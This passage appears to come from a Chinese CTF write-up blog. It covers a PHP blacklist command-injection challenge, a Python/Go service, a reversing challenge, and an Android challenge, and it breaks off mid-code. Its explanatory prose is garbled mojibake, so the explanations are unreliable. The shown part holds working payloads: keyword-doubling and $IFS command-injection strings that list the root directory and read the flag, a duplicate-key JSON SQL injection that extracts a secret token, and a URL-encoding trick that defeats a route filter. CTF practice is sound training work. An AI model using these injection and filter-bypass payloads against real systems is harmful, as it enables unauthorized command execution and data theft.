<span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å¸¦é»‘åå•çš„æ— å›æ˜¾RCEï¼Œå¯ä»¥é‡å®šå‘å†™å‘½ä»¤æ‰§è¡Œç»“æœåˆ°æ–‡ä»¶ï¼Œå…³é”®å­—å¯åŒå†™ç»•è¿‡ï¼Œç©ºæ ¼ç”¨<code>$IFS</code>ç»•è¿‡ã€‚</p><p>åˆ—ç›®å½•ï¼š<code>?cmd=llss$IFS/&gt;1.txt</code>ï¼Œå¾—åˆ°æ ¹ç›®å½•flagæ–‡ä»¶å <code>ctf_is_fun_flag2021</code>ï¼›</p><p>è¯»æ–‡ä»¶ï¼š<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>ï¼Œå¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>æºç é‡Œæœ‰pythonå’Œgoä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ‰ä¸¤ä¸ªæœåŠ¡ï¼Œç«¯å£8000æ˜¯pythonå¼€çš„ï¼Œæ˜ å°„åˆ°å¯¹å¤–ç«¯å£ï¼›å†…ç½‘ç«¯å£5000æ˜¯goæœåŠ¡ã€‚pythonä»£ç ç›¸å½“äºä¸­è½¬ç«™æ¥å—å¤–ç½‘è¯·æ±‚ï¼Œå¤„ç†åè½¬å‘ç»™goï¼Œgoè¿›è¡Œåº•å±‚å¤„ç†ã€‚</p><p>goæœåŠ¡ä¸­å…³é”®ä»£ç  <code>backend.go</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">Id  <span class="type">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Name <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Votes <span class="type">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">rows, err := db.Sqlite.Query(query)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret <span class="type">string</span></span><br><span class="line">row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="type">string</span>(data)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·¯ç”± <code>/flag</code> ä¸­GETä¸¤ä¸ªå‚æ•° <code>?action=readFlag&amp;token=xxxxx</code>ï¼Œtokenæ­£ç¡®å¾—flagï¼Œè€Œè·¯ç”± <code>/search</code> ä¸­å®¹æ˜“é€šè¿‡SQLæ³¨å…¥æ‹¿åˆ°tokenã€‚</p><p>pythonæœåŠ¡ä¸­ <code>app.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listAll</span>():</span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">healthCheck</span>():</span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶ä¸­å­˜åœ¨ä¸¤ä¸ªç‚¹éœ€è¦ç»•è¿‡ï¼š</p><ol><li>è·¯ç”± <code>/search</code> ä¸­JSONä¸¥æ ¼è¿‡æ»¤ï¼Œ<code>name</code> çš„å€¼å¿…é¡»æ»¡è¶³ <code>isalnum()</code>ï¼Œ<code>votes</code> çš„å€¼å¿…é¡»ä¸ºæ•°å­—ï¼Œé¿å…SQLæ³¨å…¥æƒ…å†µï¼›</li><li>æ£€æµ‹urlé‡Œä½¿ç”¨GETæ–¹æ³•ä¼ å…¥ <code>action=readFlag</code> ä¼šç›´æ¥æ‹’ç»ã€‚</li></ol><p>å¯¹äºç¬¬1ç‚¹ï¼Œå°è¯•æ„é€ å«ä¸¤ä¸ª <code>name</code> å‚æ•°çš„JSONï¼Œåœ¨pythonä¸­è®¤JSONä¸­ç¬¬äºŒä¸ª <code>name</code>ï¼Œè€Œgoä¸­è®¤JSONä¸­ç¬¬ä¸€ä¸ª <code>name</code>ï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚æ„é€ ï¼š<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>ï¼Œç»•è¿‡å¾—åˆ°tokenå€¼ï¼Œå¾—åˆ° <code>re@l1y_4th_T0k3n</code>ã€‚</p><p>å¯¹äºç¬¬2ç‚¹ï¼Œåˆ©ç”¨ <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> ç‰¹æ€§ï¼Œå¯¹ <code>?</code> è¿›è¡Œurlç¼–ç å¯ä»¥åœ¨pythonå±‚é¢ç»•è¿‡GETå‚æ•°è¯†åˆ«ï¼Œå³ <code>action = request.args.get(&#39;action&#39;)</code> ä¸ä¼šè·å–åˆ°å†…å®¹ï¼Œpayloadï¼š<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>ã€‚</p><p>å¾—åˆ°flagï¼š<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-â–½-â”›"><a href="#hiahia-o-â–½-â”›" class="headerlink" title="hiahia o(*^â–½^*)â”›"></a>hiahia o(*^â–½^*)â”›</h3><p>IDAæŸ¥çœ‹ä¼ªç ï¼Œæ— é€†å‘ï¼Œç…§ç€å®ç°å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">c,k</span>):</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadxæŸ¥çœ‹MainActivityä¸»é€»è¾‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">trim</span> <span class="operator">=</span> <span class="built_in">this</span>.input.getText().toString().trim();</span><br><span class="line"><span class="type">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAGé”™è¯¯&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>[] charArray = trim.toCharArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span 